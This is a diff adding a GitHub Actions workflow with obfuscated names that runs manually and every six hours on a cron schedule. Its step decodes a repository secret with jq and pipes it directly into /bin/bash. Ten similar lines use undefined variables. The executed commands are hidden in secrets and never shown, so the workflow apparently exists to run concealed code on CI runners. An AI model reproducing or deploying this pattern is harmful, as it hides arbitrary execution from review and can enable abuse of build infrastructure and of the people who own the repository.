@@ -1,0 +1,28 @@
+name: wangpinru6718
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wangpinru6718
+        env:
+          gxwwu37: ${{ secrets.gxwwu37 }}
+        run: |
+          echo $gxwwu37 | jq -r .u2 | /bin/bash
+          echo $rthmi11 | jq -r .gc0 | /bin/bash
+          echo $ijiey512 | jq -r .iggxl58 | /bin/bash
+          echo $uxt6 | jq -r .vfhy1 | /bin/bash
+          echo $f639 | jq -r .h35 | /bin/bash
+          echo $fwgh88 | jq -r .cehva11639 | /bin/bash
+          echo $vt005 | jq -r .wz71 | /bin/bash
+          echo $q5 | jq -r .w4 | /bin/bash
+          echo $n31693 | jq -r .zo52 | /bin/bash
+          echo $ff0 | jq -r .hgq445 | /bin/bash
+          echo $tvaz679 | jq -r .m8622 | /bin/bash
+
